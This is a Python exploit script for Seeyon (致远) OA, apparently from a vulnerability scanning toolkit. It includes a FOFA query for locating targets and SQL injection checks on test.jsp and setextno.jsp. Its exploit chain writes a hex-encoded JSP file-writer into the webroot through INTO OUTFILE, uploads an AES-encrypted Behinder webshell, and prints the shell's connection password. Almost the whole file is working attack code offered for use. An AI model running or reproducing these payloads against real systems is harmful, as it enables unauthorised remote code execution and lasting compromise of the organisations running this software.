#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
import random
import re
from Config.config_requests import headers
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# 脚本信息
######################################################
NAME='Seeyon_OA_SQLInjection'
AUTHOR="Joker"
REMARK='致远OA SQL注入漏洞'
FOFA_RULE='title="致远A8+协同管理软件.A6"'
######################################################

def poc(target):
    result = {}
    vuln_url = target + "/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20@@basedir)"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        r1 = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        if '序号' in r1.text and "@@basedir" in r1.text and r1.status_code == 200:
            result['target'] = target
            result['poc'] = NAME
            return result
        else:
            pass
    except Exception as e:
        pass

def exp(target):
    vuln_url = target + "/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20@@basedir)"
    vuln_ur2 = target + "/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999) union all select 1,2,(md5(1)),4#"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        r1 = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        if '序号' in r1.text and "@@basedir" in r1.text and r1.status_code == 200:
            OA_dir = re.findall(r'>(.*)\\UFseeyon\\', r1.text)[0]
            OA_dir = OA_dir[:2] + '/' + OA_dir[3:]
            print ('[+] ' + target + "存在致远OA test.jsp sql注入漏洞，安装路径为:{}".format(target, OA_dir))
            webshell_name = "test_upload{}.jsp".format(random.randint(1,999))
            OA_dir = OA_dir + "/UFseeyon/OA/tomcat/webapps/yyoa/{}".format(webshell_name)
            exp1(target, OA_dir, webshell_name)
        else:
            pass
    except Exception as e:
        print("目标 {} 请求失败".format(target), e)

    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        r2 = requests.get(url=vuln_ur2, headers=headers, verify=False, timeout=5)
        if r2.status_code == 200 and "c4ca4238a0b923820dcc509a6f75849b" in r2.text:
            print ("[+] {} 存在致远OA setextno.jsp sql注入漏洞".format(target, vuln_ur2))
        else:
             pass
    except Exception as e:
        print("目标 {} 请求失败".format(target))

def exp1(target, OA_dir, webshell_name):
    vuln_url = target + "/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20unhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27)%20%20into%20outfile%20%27{}%27".format(OA_dir)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, verify=False, timeout=5)
        if 'already' in response.text and  response.status_code == 200:
            print("文件写入木马上传失败，目标已存在相同文件，请重新运行")
        elif "No Data" in response.text and  response.status_code == 200:
            print("[o] 文件写入木马上传成功，上传路径为 {}".format(OA_dir))
            exp2(target, webshell_name)
        else:
            print("[x] 目标 {} 木马上传失败".format(target))
    except Exception as e:
        print("[x] 目标 {} 请求失败".format(target), e)

def exp2(target, webshell_name):
    rebe_webshell = "testweb{}.jsp".format(random.randint(1,999))
    vuln_url = target + "/yyoa/{}?f={}".format(webshell_name, rebe_webshell)
    data = "t=%3C%25%40page%20import%3D%22java.util.*%2Cjavax.crypto.*%2Cjavax.crypto.spec.*%22%25%3E%3C%25!class%20U%20extends%20ClassLoader%7BU(ClassLoader%20c)%7Bsuper(c)%3B%7Dpublic%20Class%20g(byte%20%5B%5Db)%7Breturn%20super.defineClass(b%2C0%2Cb.length)%3B%7D%7D%25%3E%3C%25if%20(request.getMethod().equals(%22POST%22))%7BString%20k%3D%223c961f49d5fa96c5%22%3Bsession.putValue(%22u%22%2Ck)%3BCipher%20c%3DCipher.getInstance(%22AES%22)%3Bc.init(2%2Cnew%20SecretKeySpec(k.getBytes()%2C%22AES%22))%3Bnew%20U(this.getClass().getClassLoader()).g(c.doFinal(new%20sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext)%3B%7D%25%3E"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        print("[o] 正在请求：{}".format(vuln_url))
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        if response.status_code == 200:
            print("[o] 木马上传成功, 路径为:{}/yyoa/{}".format(target, rebe_webshell))
            print("[o] 请使用冰蝎连接，密码为: szxsd")
        else:
            print("[x] 木马上传失败，可能被拦截".format(target))
    except Exception as e:
        print("[x] 目标 {} 请求失败".format(target), e)


if __name__ == '__main__':
    poc("https://127.0.0.1")